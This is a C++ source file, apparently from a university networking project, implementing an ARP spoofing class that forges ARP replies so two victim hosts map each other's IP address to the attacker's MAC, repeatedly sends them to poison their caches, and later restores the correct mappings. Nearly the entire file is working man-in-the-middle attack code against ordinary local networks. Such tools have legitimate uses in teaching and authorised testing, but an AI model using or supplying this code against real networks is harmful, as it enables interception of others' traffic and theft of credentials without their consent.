/**
 * @author      Peter Gazdík <xgazdi03(at)stud.fit.vutbr.cz>
 * @date        17/04/17
 * @copyright   The MIT License (MIT)
 */

#include <linux/if_ether.h>
#include "arpspoof.h"

using namespace std;

namespace pds
{


static const std::size_t MSG_LEN = ETH_HDR_LEN + ARP_MSG_LEN;;

arpspoof::arpspoof()
{
}

arpspoof::~arpspoof()
{

}

void arpspoof::init()
{
    _pcap = new pcap(_interface.c_str());
    _interInfo = getInterfaceInfo(_interface.c_str());

    createARPMessages();
}

void arpspoof::stopSpoofing()
{
    struct eth_hdr *ethHdr1, *ethHdr2;
    struct arp_msg *arpMsg1, *arpMsg2;
    ethHdr1 = (struct eth_hdr *) _victim1msg;
    ethHdr2 = (struct eth_hdr *) _victim2msg;
    arpMsg1 = (struct arp_msg *) (_victim1msg + ETH_HDR_LEN);
    arpMsg2 = (struct arp_msg *) (_victim2msg + ETH_HDR_LEN);

    // Use the correct ethernet addresses
    ethHdr1->eth_src = *_victim2.eth.getMAC();
    arpMsg1->sha = *_victim2.eth.getMAC();
    ethHdr2->eth_src = *_victim1.eth.getMAC();
    arpMsg2->sha = *_victim1.eth.getMAC();

    _pcap->sendpacket(_victim1msg, MSG_LEN);
    _pcap->sendpacket(_victim2msg, MSG_LEN);
}

void arpspoof::createARPMessages()
{
    // Alocate momory for the arp messages
    _victim1msg = new uint8_t[MSG_LEN];
    _victim2msg = new uint8_t[MSG_LEN];

    struct eth_hdr *ethHdr1, *ethHdr2;
    struct arp_msg *arpMsg1, *arpMsg2;
    ethHdr1 = (struct eth_hdr *) _victim1msg;
    ethHdr2 = (struct eth_hdr *) _victim2msg;
    arpMsg1 = (struct arp_msg *) (_victim1msg + ETH_HDR_LEN);
    arpMsg2 = (struct arp_msg *) (_victim2msg + ETH_HDR_LEN);

    // Set the common entries
    ethHdr1->eth_type = ethHdr2->eth_type = htons(ETH_P_ARP);
    ethHdr1->eth_src = ethHdr2->eth_src = *_interInfo.mac.getMAC();
    initARPReply(arpMsg1); initARPReply(arpMsg2);
    arpMsg1->sha = arpMsg2->sha = *_interInfo.mac.getMAC();

    // Set the unique entries
    arpMsg1->tpa = _victim1.net.getIPv4();
    arpMsg1->tha = *_victim1.eth.getMAC();
    ethHdr1->eth_dst = *_victim1.eth.getMAC();
    arpMsg1->spa = _victim2.net.getIPv4();

    arpMsg2->tpa = _victim2.net.getIPv4();
    arpMsg2->spa = _victim1.net.getIPv4();
    arpMsg2->tha = *_victim2.eth.getMAC();
    ethHdr2->eth_dst = *_victim2.eth.getMAC();
}

void arpspoof::poisoneCache()
{
    _pcap->sendpacket(_victim1msg, MSG_LEN);
    _pcap->sendpacket(_victim2msg, MSG_LEN);
}

} // namespace pds
